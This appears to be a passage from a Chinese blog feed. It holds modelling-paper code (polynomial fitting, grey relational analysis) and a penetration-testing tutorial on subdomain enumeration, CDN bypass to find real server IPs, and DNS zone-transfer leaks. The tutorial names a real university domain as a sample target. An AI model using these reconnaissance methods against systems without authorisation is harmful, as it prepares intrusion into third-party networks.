punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'二氧化硅与氧化铜含量散点拟合曲线'</span><span class="token punctuation">)</span>mymodel <span class="token operator">=</span> numpy<span class="token punctuation">.</span>poly1d<span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>polyfit<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>myline <span class="token operator">=</span> numpy<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token comment"># 原始散点图</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>myline<span class="token punctuation">,</span> mymodel<span class="token punctuation">(</span>myline<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 多项式回归</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>polyfit<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录3-对高钾玻璃、铅钡玻璃进行亚分类的划分结果"><a href="#附录3-对高钾玻璃、铅钡玻璃进行亚分类的划分结果" class="headerlink" title="附录3 对高钾玻璃、铅钡玻璃进行亚分类的划分结果"></a>附录3 对高钾玻璃、铅钡玻璃进行亚分类的划分结果</h4><p>高钾玻璃</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps170.jpg" alt="img"> </p><p>铅钡玻璃</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps171.jpg" alt="img"> </p><h4 id="附录4-灰色关联分析Matlab实现代码"><a href="#附录4-灰色关联分析Matlab实现代码" class="headerlink" title="附录4 灰色关联分析Matlab实现代码"></a>附录4 灰色关联分析Matlab实现代码</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">x1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.97731</span> <span class="token number">1.29178</span> <span class="token number">0.74085</span> <span class="token number">0.1866</span> <span class="token operator">-</span><span class="token number">0.60495</span> <span class="token operator">-</span><span class="token number">0.45975</span> <span class="token operator">-</span><span class="token number">0.96173</span> <span class="token operator">-</span><span class="token number">0.19092</span> <span class="token number">2.43346</span> <span class="token number">0.39734</span> <span class="token operator">-</span><span class="token number">0.49958</span> <span class="token number">0.05052</span> <span class="token operator">-</span><span class="token number">0.21996</span> <span class="token number">0.14428</span> <span class="token operator">-</span><span class="token number">0.1428</span> <span class="token operator">-</span><span class="token number">0.57176</span> <span class="token number">0.42721</span> <span class="token number">0.11773</span> <span class="token operator">-</span><span class="token number">1.71013</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">3.74896</span> <span class="token number">2.18943</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">1.11262</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">1.89238</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span><span class="token punctuation">;</span><span class="token number">0.26337</span> <span class="token operator">-</span><span class="token number">0.0789</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.85457</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.48118</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.48118</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.54342</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.01049</span> <span class="token operator">-</span><span class="token number">1.2482</span> <span class="token operator">-</span><span class="token number">1.06847</span> <span class="token operator">-</span><span class="token number">0.81916</span> <span class="token operator">-</span><span class="token number">0.37852</span> <span class="token number">1.41303</span> <span class="token number">1.57537</span> <span class="token number">2.24792</span> <span class="token number">0.17228</span> <span class="token number">1.19271</span> <span class="token number">0.3868</span> <span class="token number">0.61292</span> <span class="token number">1.51159</span> <span class="token operator">-</span><span class="token number">0.1466</span> <span class="token number">0.3868</span> <span class="token operator">-</span><span class="token number">1.46272</span> <span class="token operator">-</span><span class="token number">0.76118</span> <span class="token operator">-</span><span class="token number">0.7032</span> <span class="token number">0.56074</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token number">3.03422</span> <span class="token number">0.40871</span> <span class="token number">0.49432</span> <span class="token number">1.3362</span> <span class="token number">1.23631</span> <span class="token operator">-</span><span class="token number">0.19059</span> <span class="token number">0.83678</span> <span class="token number">1.20778</span> <span class="token operator">-</span><span class="token number">0.07644</span> <span class="token number">0.9652</span> <span class="token number">0.72263</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token number">0.26602</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.53585</span> <span class="token operator">-</span><span class="token number">0.54356</span> <span class="token operator">-</span><span class="token number">0.16943</span> <span class="token operator">-</span><span class="token number">0.96783</span> <span class="token operator">-</span><span class="token number">0.98711</span> <span class="token number">0.1237</span> <span class="token operator">-</span><span class="token number">0.29286</span> <span class="token number">0.15456</span> <span class="token number">4.10411</span> <span class="token number">0.91438</span> <span class="token operator">-</span><span class="token number">0.43942</span> <span class="token number">0.86424</span> <span class="token operator">-</span><span class="token number">0.19257</span> <span class="token operator">-</span><span class="token number">0.71327</span> <span class="token number">0.43997</span> <span class="token number">0.24712</span> <span class="token operator">-</span><span class="token number">0.44714</span> <span class="token operator">-</span><span class="token number">0.31985</span> <span class="token number">0.19698</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.18267</span> <span class="token operator">-</span><span class="token number">0.38351</span> <span class="token operator">-</span><span class="token number">0.42368</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.55758</span> <span class="token number">1.58475</span> <span class="token number">0.20563</span> <span class="token number">1.04917</span> <span class="token number">0.92866</span> <span class="token number">2.85676</span> <span class="token operator">-</span><span class="token number">0.37013</span> <span class="token number">0.78138</span> <span class="token operator">-</span><span class="token number">0.24962</span> <span class="token operator">-</span><span class="token number">0.50402</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token number">0.33952</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.21803</span> <span class="token operator">-</span><span class="token number">0.63577</span> <span class="token operator">-</span><span class="token number">0.6106</span> <span class="token operator">-</span><span class="token number">0.53511</span> <span class="token operator">-</span><span class="token number">0.97801</span> <span class="token operator">-</span><span class="token number">0.88238</span> <span class="token number">1.71462</span> <span class="token operator">-</span><span class="token number">0.21803</span> <span class="token operator">-</span><span class="token number">0.97801</span> <span class="token operator">-</span><span class="token number">0.6257</span> <span class="token operator">-</span><span class="token number">0.40929</span> <span class="token operator">-</span><span class="token number">0.2885</span> <span class="token operator">-</span><span class="token number">0.60054</span> <span class="token operator">-</span><span class="token number">0.6257</span> <span class="token operator">-</span><span class="token number">0.56027</span> <span class="token operator">-</span><span class="token number">0.30359</span> <span class="token operator">-</span><span class="token number">0.58041</span> <span class="token operator">-</span><span class="token number">0.39419</span> <span class="token number">0.5973</span><span class="token punctuation">;</span><span class="token number">0.54957</span> <span class="token number">0.22954</span> <span class="token number">0.72837</span> <span class="token number">1.50511</span> <span class="token operator">-</span><span class="token number">1.99899</span> <span class="token number">0.39214</span> <span class="token number">1.41118</span> <span class="token number">0.43296</span> <span class="token operator">-</span><span class="token number">1.44834</span> <span class="token operator">-</span><span class="token number">0.2518</span> <span class="token number">0.38437</span> <span class="token operator">-</span><span class="token number">2.19139</span> <span class="token number">0.85988</span> <span class="token number">0.60593</span> <span class="token number">1.12678</span> <span class="token number">1.32113</span> <span class="token number">0.20622</span> <span class="token number">0.45563</span> <span class="token number">0.08313</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.00644</span> <span class="token operator">-</span><span class="token number">0.92412</span> <span class="token operator">-</span><span class="token number">0.13464</span> <span class="token operator">-</span><span class="token number">0.38953</span> <span class="token operator">-</span><span class="token number">0.4421</span> <span class="token operator">-</span><span class="token number">0.13761</span> <span class="token operator">-</span><span class="token number">0.38259</span> <span class="token operator">-</span><span class="token number">0.78229</span> <span class="token operator">-</span><span class="token number">0.38061</span> <span class="token operator">-</span><span class="token number">0.50061</span> <span class="token number">0.30275</span> <span class="token operator">-</span><span class="token number">0.21894</span> <span class="token operator">-</span><span class="token number">1.10562</span> <span class="token operator">-</span><span class="token number">0.2487</span> <span class="token operator">-</span><span class="token number">0.37168</span> <span class="token operator">-</span><span class="token number">1.10562</span> <span class="token number">0.42672</span> <span class="token number">0.61021</span> <span class="token operator">-</span><span class="token number">0.34589</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.16317</span> <span class="token operator">-</span><span class="token number">1.07604</span> <span class="token operator">-</span><span class="token number">1.12929</span> <span class="token operator">-</span><span class="token number">0.96471</span> <span class="token operator">-</span><span class="token number">0.81708</span> <span class="token number">0.56002</span> <span class="token operator">-</span><span class="token number">1.24546</span> <span class="token number">1.85967</span> <span class="token operator">-</span><span class="token number">0.97923</span> <span class="token number">1.44097</span> <span class="token number">0.28896</span> <span class="token number">0.71491</span> <span class="token number">0.87223</span> <span class="token number">0.13648</span> <span class="token operator">-</span><span class="token number">0.21929</span> <span class="token number">2.1743</span> <span class="token operator">-</span><span class="token number">0.63072</span> <span class="token operator">-</span><span class="token number">1.24546</span> <span class="token number">0.93031</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.70924</span> <span class="token operator">-</span><span class="token number">0.70924</span> <span class="token operator">-</span><span class="token number">0.03905</span> <span class="token number">0.66641</span> <span class="token number">0.91332</span> <span class="token number">0.17259</span> <span class="token number">0.77223</span> <span class="token number">0.17259</span> <span class="token operator">-</span><span class="token number">0.60342</span> <span class="token number">0.13731</span> <span class="token number">0.84278</span> <span class="token operator">-</span><span class="token number">0.1096</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token number">0.06677</span> <span class="token number">1.61879</span> <span class="token number">2.46535</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token operator">-</span><span class="token number">0.6387</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token number">4.79574</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token number">1.56377</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span><span class="token punctuation">;</span><span class="token punctuation">]</span><span class="token comment">%原始数据14行19列</span>x<span class="token operator">=</span>x1<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">x1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span>x1<span class="token operator">=</span>x<span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">x1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span>max<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>min<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token keyword">if</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">>=</span>max      max<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token keyword">if</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>min      min<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span><span class="token keyword">end</span>k<span class="token operator">=</span><span class="token number">0.5</span> <span class="token comment">%分辨系数取值</span>l<span class="token operator">=</span><span class="token punctuation">(</span>min<span class="token operator">+</span>k<span class="token operator">*</span>max<span class="token punctuation">)</span><span class="token operator">./</span><span class="token punctuation">(</span>x<span class="token operator">+</span>k<span class="token operator">*</span>max<span class="token punctuation">)</span><span class="token comment">%求关联系数矩阵</span>guanlianxing<span class="token operator">=</span><span class="token function">sum</span><span class="token punctuation">(</span>l<span class="token operator">'</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">[</span>rs<span class="token punctuation">,</span>rind<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">sort</span><span class="token punctuation">(</span>guanlianxing<span class="token punctuation">,</span><span class="token string">'descend'</span><span class="token punctuation">)</span> <span class="token comment">%对关联度进行排序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录5-表单2数据规律统计表"><a href="#附录5-表单2数据规律统计表" class="headerlink" title="附录5 表单2数据规律统计表"></a>附录5 表单2数据规律统计表</h4>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子域名深度挖掘</title>
      <link href="/2022/10/30/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B7%B1%E5%BA%A6%E6%8C%96%E6%8E%98/"/>
      <url>/2022/10/30/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B7%B1%E5%BA%A6%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h2 id="子域名深度挖掘"><a href="#子域名深度挖掘" class="headerlink" title="子域名深度挖掘"></a>子域名深度挖掘</h2><p>[TOC]</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h3><p>企业可能有多个、几十个甚至很多的子域名应用，因为子域名数量多，企业在人员和防护的投入可能会没有主站及时。攻击者在主域名找不到突破口时，就可以进行子域名的信息收集，然后通过子域名的漏洞进行迂回。</p><p><del>例如:<a href="http://www.qfnu.edu.cn主域不存在漏洞,并且防护措施严密,而二级域名/">www.qfnu.edu.cn主域不存在漏洞，并且防护措施严密，而二级域名</a> jsj.qfnu.edu.cn存在漏洞，防护措施松散，可以采用迂回战术拿下子域名，然后逐步靠近主域。</del></p><blockquote><p style="color:orange;">目的：核心目标久攻不下，从侧面展开攻击并逐步获取核心目标权限</p></blockquote><h3 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h3><h4 id="1-1-域名类别"><a href="#1-1-域名类别" class="headerlink" title="1.1 域名类别"></a>1.1 域名类别</h4><img src="./子域名深度挖掘/域名分类.png" alt="" style="zoom:50%;" /><center>1-1 域名分类</center>#### 1.2 子域名<p>子域名是在域名系统等级中属于更高一层域的域。比如：jsj.qfnu.edu.cn和da.qfnu.edu.cn是qfnu.edu.cn的两个子域。</p><img src="./子域名深度挖掘/攻击阶段列举.png" style="zoom:80%;" /><center>1-2 渗透测试阶段举例</center>在网络攻防的过程中，信息收集是非常重要的一步， 通过信息收集可以了解渗透目标的网络架构，描述出相关 的网络拓扑，缩小攻击范围。只有将目标的相关信息收集 完整，才可以对攻击目标开启的主机及主机安装运行的应 用，针对性的进行有效攻击。我们要讲的内容子域名深度挖掘实际上只是其中一部分，还有像whois域名注册信息查询，网站后台(敏感/备份文件&目录)扫描，whois查询和反查/IP查询和反查/C段查询， Email信息收集， WEB指纹识别&WEB后台扫描等众多的内容<p>为了保证网络的稳定网站服务商会在网络的不同位置设置节点服务器，通过 CDN技术，将网络请求分发到最优的节点服务器上面。</p><h4 id="1-3-CDN判断与绕过"><a href="#1-3-CDN判断与绕过" class="headerlink" title="1.3 CDN判断与绕过"></a>1.3 CDN判断与绕过</h4><p>当CDN技术成熟时，不只是正常用户部署有CDN，比如服务器部署正国外的<del>不法网站</del>往往会采用国内的CDN，使国内用户访问。</p><blockquote><p style="color:red;">站长工具：http://ping.chinaz.com/</p><p style="color:red;">爱站网：https://ping.aizhan.com/</p><p style="color:red;">国外 ping 探测：https://asm.ca.com/en/ping.php</p></blockquote><p>利用站长工具对<a href="http://www.baidu.com多地探测返回的结果,发现有多达15个不同的ip,www.baidu.com同时有显示cdn提供商为百度云加速,这个应该算理所当然,百度没cdn才属于离谱./">www.baidu.com多地探测返回的结果，发现有多达15个不同的IP,www.baidu.com同时有显示CDN提供商为百度云加速，这个应该算理所当然，百度没CDN才属于离谱。</a></p><h5 id="nslookup域名解析"><a href="#nslookup域名解析" class="headerlink" title="nslookup域名解析"></a>nslookup域名解析</h5><p>通过系统自带的【nslookup】命令对域名解析, 发现有【39.156.66.18】和【39.156.66.14】两个 不同的IP,说明【<a href="http://www.baidu.com】可能使用了cdn./">www.baidu.com】可能使用了CDN。</a></p><h5 id="有CDN例子"><a href="#有CDN例子" class="headerlink" title="有CDN例子"></a>有CDN例子</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># www.abc.com</span><span class="token comment"># 服务器:public1.114dns.com</span><span class="token comment"># Address: 114.114.114.114 </span>非权威应答：<span class="token comment"># 名称:abc.xdwscache.ourglb0.com</span><span class="token comment"># Addresses: 58.223.164.86 125.75.32.252</span><span class="token comment"># Aliases: www.abc.com</span><span class="token comment"># www.abc.com.lxdns.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="无CDN例子"><a href="#无CDN例子" class="headerlink" title="无CDN例子"></a>无CDN例子</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php">abc<span class="token operator">.</span>com服务器<span class="token punctuation">:</span>public1<span class="token operator">.</span><span class="token number">114</span>dns<span class="token operator">.</span>comAddress<span class="token punctuation">:</span> <span class="token number">114.114</span><span class="token number">.114</span><span class="token number">.114</span>非权威应答：名称<span class="token punctuation">:</span>abc<span class="token operator">.</span>comAddress<span class="token punctuation">:</span> <span class="token number">192.12</span><span class="token number">.168</span><span class="token number">.172</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-4-绕过CDN获取真实IP"><a href="#1-4-绕过CDN获取真实IP" class="headerlink" title="1.4 绕过CDN获取真实IP"></a>1.4 绕过CDN获取真实IP</h4><h5 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名"></a>查询子域名</h5><blockquote><p style="color:skyblue;">子域名可能跟主站在同一个服务 器或者同一个C段网络中，可以通过子 域名探测的方式，收集目标的子域名 信息,通过查询子域名的IP信息来辅助 判断主站的真实IP信息。</p></blockquote><p>作用：IP/域名-&gt;同网段下的IP<br>通过IP或域名可以查询同网段的不同IP ，查询手段：webscan或其他工具   <a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><h5 id="使用国外主机解析域名"><a href="#使用国外主机解析域名" class="headerlink" title="使用国外主机解析域名"></a>使用国外主机解析域名</h5><p>探测的方式也有两种，一种是利用 自己已有的境外的主机直接进行探测, 另一种如果没有国外主机可以利用公开的多地ping服务，多地ping服务有国外的探测节点，可以利用国外节点的返回信息来判断真实的IP信息。</p><h5 id="网站漏洞"><a href="#网站漏洞" class="headerlink" title="网站漏洞"></a>网站漏洞</h5><p>利用网站存在的漏洞，信息泄露的敏感信息、文件，如phpinfo文件、网站源码文件、Github泄露的信息等都可能会将真实的IP信息泄露。</p><p>邮件的信息中会记录邮件服务器的IP信息，有些站点有类似于RSS邮件订阅可以发送邮件的功能，可以利用其发送的邮件，通过查看源码的方式查看真实服务器的IP信息。</p><img src="./子域名深度挖掘/获取子域名的方式.png" style="zoom:67%;" /><center><p>1-3  获取子域名的方式</p></center>### 二、挖掘工具<h4 id="2-1子域名挖掘手段"><a href="#2-1子域名挖掘手段" class="headerlink" title="2.1子域名挖掘手段"></a>2.1子域名挖掘手段</h4><ul><li>DNS域传送漏洞发现子域名（这个漏洞比较早现在已经有很少应用）</li><li>搜索引擎发现子域名</li><li>证书透明性信息发现子域名</li><li>第三方聚合服务发现子域名</li><li>子域名枚举发现子域名</li></ul><h4 id="2-2-DNS域传送"><a href="#2-2-DNS域传送" class="headerlink" title="2.2 DNS域传送"></a>2.2 DNS域传送</h4><p>作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库<br>若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。<br>大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用Private DNS。如果内部DNS泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部1网络沦陷。<br>当然这个漏洞非常鸡肋，只有大公司会用Private DNS服务器，但是一个古老漏洞，会出现问题的可能性不大。</p><h4 id="2-3-搜索引擎发现子域名"><a href="#2-3-搜索引擎发现子域名" class="headerlink" title="2.3 搜索引擎发现子域名"></a>2.3 搜索引擎发现子域名</h4><blockquote><p style="color:blue;">搜索语法：site:baidu.com</p></blockquote><p>site语法设定的初衷是为了实现精准搜索。索引结果数不是一个网站在搜索引擎中的站点评级指标。搜索结果中URL后面的时间戳不必太过关注。site语法查询的检索结果只能说明网页被收录。<br>site：后面带不带www结果可能是不一样的，因为有些域名还包括二级域名，如：site：www。某某。com和site：某某。com，搜索结果就不一样，site：和站点名之间，不要带空格。</p><p><strong>搜索引擎发现子域名（拓展）</strong></p><blockquote><p>url前不能带http:// , 现在Google搜索可以带http:// Google会自动忽略，百度依然不能忽略带”http://“的搜索。</p></blockquote><blockquote><p>搜索引擎 site:<a href="http://www.sina.com.cn/">http://www.sina.com.cn</a></p></blockquote><p style="color:red;">Google结果：所有网站 www.sina. com.cn 上约有1660项符合 搜索引擎的查询结果，以下是第 1 - 10 项。Baidu结果：抱歉，没有找到与“site:ht tp://finance.sina.com.cn” 相关的网页。</p>> 搜索引擎：site:www.sina.com.cn<p>Google结果：所有网站 <a href="http://www.sina.com.cn/">www.sina.com.cn</a> 上约有1660项符合 搜索引擎的查询结果，以下是第 1 - 10 项。<br>Baidu结果：百度一下，找到相关网页约3,210篇，用时0.057秒。B、在过去url后边不能带斜杠“/”，现在Google和Baidu都可以带”/“。</p><p>比如说：https: //crt.sh/ 与 https ://censys.io/</p><p style="color:orange;">因为证书透明性只能查到有证书的网站，所以这里获取的域名一般没问题，而且数量较少。证书透明性获取的子域名数量其实远小于通过搜索引擎获取，一般是作为一些补充。</p>#### 2.4 枚举工具<h5 id="one-for-all"><a href="#one-for-all" class="headerlink" title="one for all"></a>one for all</h5><p>下载地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a><br>一款集百家之长，功能强大的全面快速子域收集终极神器，收集子域名快速且全面，但要注意一定要配置API，否 则收集的子域名会不够全。<br>注意：这个建议在虚拟机运行，直接用kali linux开个docker把环境加载进去就行。</p><h5 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h5><p>下载地址：<a href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a><br>这个地址下载到的其实是说这个攻击的源代码，如我在课下会把这个工具的正常使用版本放在群里。</p><h5 id="JSFinder"><a href="#JSFinder" class="headerlink" title="JSFinder"></a>JSFinder</h5><p>下载地址：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a> ,一款用作快速在网站的js文件中提取URL，子域名的工具。<br>Knock Subdomain Scan 